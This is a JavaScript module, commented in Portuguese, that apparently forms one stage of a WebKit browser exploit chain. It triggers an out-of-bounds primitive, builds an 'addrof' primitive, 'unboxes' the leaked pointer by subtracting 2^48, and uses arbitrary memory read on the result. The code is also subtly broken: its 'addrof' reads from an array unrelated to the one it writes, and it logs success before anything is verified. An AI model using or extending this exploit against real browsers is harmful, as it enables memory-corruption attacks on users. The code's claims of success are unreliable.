// js/script3/testArrayBufferVictimCrash.mjs (v96 - R60 com Unboxing de Ponteiro)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Implementada a etapa final de "unboxing" (ou "untagging") do ponteiro. O valor
// vazado pela 'addrof' é um JSValue "encaixotado". Subtraímos o tag 2^48 para
// obter o endereço de memória real antes de usá-lo com a leitura arbitrária.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_PointerUnboxing_v96_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Verificação com Unboxing de Ponteiro ---`, "test");

    let final_result = { success: false, message: "A verificação funcional não obteve sucesso." };

    try {
        // --- FASE 1: Obtenção de primitiva OOB ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        logS3("Primitiva OOB está funcional.", "good");

        // --- FASE 2: Criando a Primitiva 'addrof' ---
        logS3("--- FASE 2: Criando Primitiva 'addrof' estável... ---", "subtest");
        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' operacional! ++++++++++++`, "vuln");

        // --- FASE 3: Verificação Funcional com Unboxing ---
        logS3("--- FASE 3: Verificando Leitura Arbitrária com Unboxing de Ponteiro... ---", "subtest");
        
        const test_obj = { verification: 0xCAFEBABE };
        const boxed_addr = addrof(test_obj);
        logS3(`Endereço "Boxed" do objeto de teste: ${boxed_addr.toString(true)}`, "info");
        
        // **NOVO**: Subtrai o tag 2^48 para obter o endereço de memória real.
        const POINTER_TAG = new AdvancedInt64(0, 0x10000); // 2^48
        const real_test_obj_addr = boxed_addr.sub(POINTER_TAG);
        logS3(`Endereço Real (após unboxing): ${real_test_obj_addr.toString(true)}`, "leak");
        
        // Agora usamos a `arb_read` com o endereço real.
        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${real_test_obj_addr.toString(true)}...`, "info");
        const header_leaked = await arb_read(real_test_obj_addr, 8);
        logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");

        // Condição de sucesso corrigida para ser mais explícita.
        if (header_leaked && !header_leaked.equals(AdvancedInt64.Zero)) {
            logS3("VERIFICAÇÃO CONCLUÍDA! O valor lido não é nulo, indicando sucesso total na leitura de memória.", "good");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura arbitrária funcional."
            };
        } else {
            throw new Error("A verificação da leitura arbitrária falhou, o valor lido foi nulo ou inválido.");
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Arbitrary R/W' }
    };
}
